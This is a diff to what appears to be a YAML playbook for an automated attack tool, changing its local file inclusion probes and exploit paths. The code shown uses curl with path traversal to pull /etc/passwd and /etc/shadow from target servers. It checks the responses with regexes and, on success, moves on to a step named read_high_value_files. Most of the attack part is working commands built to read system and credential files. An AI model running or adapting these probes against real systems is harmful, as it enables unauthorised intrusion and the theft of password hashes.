@@ -30,6 +30,8 @@ match:
 probes:
   - id: detect_lfi
     description: "三层策略探测 LFI: 绝对路径 → 相对路径深度遍历 → 编码绕过"
+    skip_if:
+      variable_present: "lfi_depth"
     command: |
       BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
       echo "=== LFI Three-Layer Probe (v4) ==="
@@ -40,7 +42,7 @@ probes:
         local url="$1"
         local result
         result=$(curl -s "$url" --max-time 6 2>/dev/null)
-        if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
+        if echo "$result" | grep -qE '[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
           echo "[HIT] $url"
           echo "$result" | head -5
           return 0
@@ -593,7 +595,7 @@ exploit_paths:
           shadow_url=$(build_url "etc/shadow")
           echo "[FETCH] $shadow_url"
           SHADOW=$(curl -s "$shadow_url" --max-time 8 2>/dev/null)
-          if ! echo "$SHADOW" | grep -qE '^[a-z_][\w.-]*:\$'; then
+          if ! echo "$SHADOW" | grep -qE '[a-z_][a-z0-9_.-]*:\$[0-9a-zA-Z]'; then
             echo "SHADOW_NOT_READABLE"
             exit 1
           fi
@@ -693,7 +695,7 @@ exploit_paths:
             URL=$(build_url "etc/passwd" "$LFI_DEPTH")
             echo "[PROBE] $URL (param=$LFI_PARAM path=$LFI_PATH depth=$LFI_DEPTH style=$LFI_STYLE)"
             result=$(curl -s "$URL" --max-time 6 2>/dev/null)
-            if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
+            if echo "$result" | grep -qE '[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)'; then
               echo "[HIT] LFI_PASSWD_OK"
               echo "$result"
               exit 0
@@ -704,7 +706,7 @@ exploit_paths:
             URL="$BASE/?$param=/etc/passwd"
             echo "[PROBE-ABS] $URL"
             result=$(curl -s "$URL" --max-time 6 2>/dev/null)
-            if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
+            if echo "$result" | grep -qE '[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)'; then
               echo "[HIT] LFI_PASSWD_OK:$param:0:absolute"
               echo "$result"
               exit 0
@@ -717,7 +719,7 @@ exploit_paths:
               URL=$(build_url "etc/passwd" "$depth")
               echo "[PROBE] $URL"
               result=$(curl -s "$URL" --max-time 6 2>/dev/null)
-              if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
+              if echo "$result" | grep -qE '[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)'; then
                 echo "[HIT] LFI_PASSWD_OK:$param:$depth"
                 echo "$result"
                 exit 0
@@ -727,7 +729,7 @@ exploit_paths:
           echo "LFI_PASSWD_FAILED"
         timeout: 60
         success_criteria:
-          stdout_regex: "^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:"
+          stdout_regex: "[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)"
         on_success: read_high_value_files
         on_fail: next_path
         evidence_capture:
